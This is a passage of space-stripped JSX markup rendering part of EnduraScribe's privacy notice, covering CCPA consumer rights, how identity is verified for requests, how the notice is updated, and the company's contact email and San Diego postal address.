style={{fontSize:15,}}><spandata-custom-class='body_text'><br/></span></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'>Allotherindividualsaredefinedas{''}<bdtclassName='block-component'/>&quot;non-residents.&quot;<bdtclassName='statement-end-if-in-editor'/></span></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><br/></span></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'>Ifthisdefinitionof{''}<bdtclassName='block-component'/>&quot;resident&quot;<bdtclassName='statement-end-if-in-editor'/>{''}appliestoyou,wemustadheretocertainrightsandobligationsregardingyourpersonalinformation.</span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><strong>Yourrightswithrespecttoyourpersonaldata</strong></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><u>Righttorequestdeletionofthedata—Requesttodelete</u></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Youcanaskforthedeletionofyourpersonalinformation.Ifyouaskustodeleteyourpersonalinformation,wewillrespectyourrequestanddeleteyourpersonalinformation,subjecttocertainexceptionsprovidedbylaw,suchas(butnotlimitedto)theexercisebyanotherconsumerofhisorherrighttofreespeech,ourcompliancerequirementsresultingfromalegalobligation,oranyprocessingthatmayberequiredtoprotectagainstillegalactivities.</span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><u>Righttobeinformed—Requesttoknow</u></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Dependingonthecircumstances,youhavearighttoknow:<spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>whetherwecollectanduseyourpersonalinformation;<spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></li></ul><div><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>thecategoriesofpersonalinformationthatwecollect;<spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></li></ul><div><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>thepurposesforwhichthecollectedpersonalinformationisused;<spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></li></ul><div><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>whetherwesellorsharepersonalinformationtothirdparties;<spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></li></ul><div><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>thecategoriesofpersonalinformationthatwesold,shared,ordisclosedforabusinesspurpose;<spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></li></ul><div><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>thecategoriesofthirdpartiestowhomthepersonalinformationwassold,shared,ordisclosedforabusinesspurpose;<spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></li></ul><div><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>thebusinessorcommercialpurposeforcollecting,selling,orsharingpersonalinformation;and<spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></li></ul><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'><spandata-custom-class='body_text'/></bdt></div><ul><listyle={{lineHeight:'1.5',}}><spandata-custom-class='body_text'>thespecificpiecesofpersonalinformationwecollectedaboutyou.<bdtclassName='statement-end-if-in-editor'/></span></li></ul><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Inaccordancewithapplicablelaw,wearenotobligatedtoprovideordeleteconsumerinformationthatisde-identifiedinresponsetoaconsumerrequestortore-identifyindividualdatatoverifyaconsumerrequest.</span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><u>RighttoNon-DiscriminationfortheExerciseofaConsumer’sPrivacyRights</u></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Wewillnotdiscriminateagainstyouifyouexerciseyourprivacyrights.</span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><u><spandata-custom-class='body_text'>RighttoLimitUseandDisclosureofSensitivePersonalInformation</span></u></span></div><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'><spandata-custom-class='body_text'/></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spandata-custom-class='body_text'>Wedonotprocessconsumer&apos;ssensitivepersonalinformation.</span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><bdtclassName='statement-end-if-in-editor'><spandata-custom-class='body_text'/></bdt></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><u>Verificationprocess</u></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Uponreceivingyourrequest,wewillneedtoverifyyouridentitytodetermineyouarethesamepersonaboutwhomwehavetheinformationinoursystem.Theseverificationeffortsrequireustoaskyoutoprovideinformationsothatwecanmatchitwithinformationyouhavepreviouslyprovidedus.Forinstance,dependingonthetypeofrequestyousubmit,wemayaskyoutoprovidecertaininformationsothatwecanmatchtheinformationyouprovidewiththeinformationwealreadyhaveonfile,orwemaycontactyouthroughacommunicationmethod(e.g.<bdtclassName='block-component'/>,<bdtclassName='statement-end-if-in-editor'/>{''}phoneoremail)thatyouhavepreviouslyprovidedtous.Wemayalsouseotherverificationmethodsasthecircumstancesdictate.</span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Wewillonlyusepersonalinformationprovidedinyourrequesttoverifyyouridentityorauthoritytomaketherequest.Totheextentpossible,wewillavoidrequestingadditionalinformationfromyouforthepurposesofverification.However,ifwecannotverifyyouridentityfromtheinformationalreadymaintainedbyus,wemayrequestthatyouprovideadditionalinformationforthepurposesofverifyingyouridentityandforsecurityorfraud-preventionpurposes.Wewilldeletesuchadditionallyprovidedinformationassoonaswefinishverifyingyou.</span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><u>Otherprivacyrights</u></span></span></span></div><div><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Youmayobjecttotheprocessingofyourpersonalinformation.<spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></span></span></span></li></ul><div><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Youmayrequestcorrectionofyourpersonaldataifitisincorrectornolongerrelevant,orasktorestricttheprocessingoftheinformation.<spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></span></span></span></li></ul><div><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Youcandesignatean{''}<bdtclassName='block-component'/>authorized<bdtclassName='statement-end-if-in-editor'/>{''}agenttomakearequestundertheCCPAonyourbehalf.Wemaydenyarequestfroman{''}<bdtclassName='block-component'/>authorized<bdtclassName='statement-end-if-in-editor'/>{''}agentthatdoesnotsubmitproofthattheyhavebeenvalidly{''}<bdtclassName='block-component'/>authorized<bdtclassName='statement-end-if-in-editor'/>{''}toactonyourbehalfinaccordancewiththeCCPA.<spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></span></span></span></li></ul><div><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Youmayrequesttooptoutfromfuturesellingorsharingofyourpersonalinformationtothirdparties.Uponreceivinganopt-outrequest,wewillactupontherequestassoonasfeasiblypossible,butnolaterthanfifteen(15)daysfromthedateoftherequestsubmission.<spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(0,0,0)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></span></span></span></li></ul><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'><spanstyle={{fontSize:15,}}/></bdt><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'><spanstyle={{fontSize:15,}}/></bdt></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Toexercisetheserights,youcancontactus{''}<bdtclassName='block-component'/>bysubmittinga&nbsp;</span></span></span><adata-custom-class='link'href='https://app.termly.io/notify/8e93c823-d220-4b99-b0fe-c1eaae946717'rel='noopenernoreferrer'target='_blank'><spanstyle={{fontSize:15,color:'rgb(0,58,250)',}}><spanstyle={{fontSize:15,color:'rgb(0,58,250)',}}>datasubjectaccessrequest</span></span></a><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>,{''}<bdtclassName='block-component'/></span><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>byemailat{''}<bdtclassName='question'>nathandai2000@gmail.com</bdt>,{''}<bdtclassName='statement-end-if-in-editor'/><bdtclassName='block-component'/></span><spandata-custom-class='body_text'><bdtclassName='block-component'/>byvisiting{''}<spanstyle={{color:'rgb(0,58,250)',}}><bdtclassName='question'><ahref='http://www.endurascribe.com/contact'target='_blank'data-custom-class='link'>http://www.endurascribe.com/contact</a></bdt></span>,{''}<bdtclassName='statement-end-if-in-editor'/><bdtclassName='block-component'><spandata-custom-class='body_text'/></bdt></span></span></span></span></span></span><spandata-custom-class='body_text'>orbyreferringtothecontactdetailsatthebottomofthisdocument.Ifyouhaveacomplaintabouthowwehandleyourdata,wewouldliketohearfromyou.</span><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'><bdtclassName='block-component'/></bdt></span></span></div><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'><spanstyle={{fontSize:15,}}/></bdt></div><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'/><bdtclassName='block-component'><spanstyle={{fontSize:15,}}/></bdt><bdtclassName='block-component'><spanstyle={{fontSize:15,}}/></bdt><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'><bdtclassName='statement-end-if-in-editor'/></bdt></span></span></span></span></span></span></span></span></span></span></span></bdt></span></span></span></span></span></span></span></span></span></span><bdtclassName='block-component'><spanstyle={{fontSize:15,}}/></bdt><bdtclassName='block-component'><spanstyle={{fontSize:15,}}/></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div><divid='policyupdates'style={{lineHeight:'1.5',}}><spanstyle={{color:'rgb(127,127,127)',}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanid='control'style={{color:'rgb(0,0,0)',}}><strong><spandata-custom-class='heading_1'>10.DOWEMAKEUPDATESTOTHISNOTICE?</span></strong></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><em><strong>InShort:&nbsp;</strong>Yes,wewillupdatethisnoticeasnecessarytostaycompliantwithrelevantlaws.</em></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Wemayupdatethisprivacynoticefromtimetotime.Theupdatedversionwillbeindicatedbyanupdated{''}<bdtclassName='block-component'/>&quot;Revised&quot;<bdtclassName='statement-end-if-in-editor'/>{''}dateandtheupdatedversionwillbeeffectiveassoonasitisaccessible.Ifwemakematerialchangestothisprivacynotice,wemaynotifyyoueitherbyprominentlypostinganoticeofsuchchangesorbydirectlysendingyouanotification.Weencourageyoutoreviewthisprivacynoticefrequentlytobeinformedofhowweareprotectingyourinformation.</span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divid='contact'style={{lineHeight:'1.5',}}><spanstyle={{color:'rgb(127,127,127)',}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanid='control'style={{color:'rgb(0,0,0)',}}><strong><spandata-custom-class='heading_1'>11.HOWCANYOUCONTACTUSABOUTTHISNOTICE?</span></strong></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Ifyouhavequestionsorcommentsaboutthisnotice,youmay{''}<spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'><bdtclassName='block-component'/></bdt>emailusat{''}<bdtclassName='question'>nathandai2000@gmail.comor&nbsp;</bdt><bdtclassName='statement-end-if-in-editor'><bdtclassName='block-component'/></bdt></span></span><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>contactusbypostat:</span></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,}}><spanstyle={{color:'rgb(89,89,89)',}}><spanstyle={{color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='question'>EnduraScribe</bdt></span></span></span></span></span><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='question'>5422FoxhoundWay</bdt><spanstyle={{color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,}}><bdtclassName='block-component'/></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='question'>SanDiego</bdt><spanstyle={{color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,}}><bdtclassName='block-component'/><bdtclassName='block-component'/>,{''}<bdtclassName='question'>CA</bdt><bdtclassName='statement-end-if-in-editor'/><bdtclassName='block-component'/><bdtclassName='block-component'/>{''}<bdtclassName='question'>92130</bdt><bdtclassName='statement-end-if-in-editor'/><bdtclassName='block-component'/><bdtclassName='block-component'/><bdtclassName='block-component'/></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><spandata-custom-class='body_text'style={{fontSize:15,}}><bdtclassName='question'>UnitedStates<spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,}}><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></bdt></span><bdtclassName='block-component'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'/></span></bdt><bdtclassName='statement-end-if-in-editor'/><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,}}><bdtclassName='statement-end-if-in-editor'/></span></span><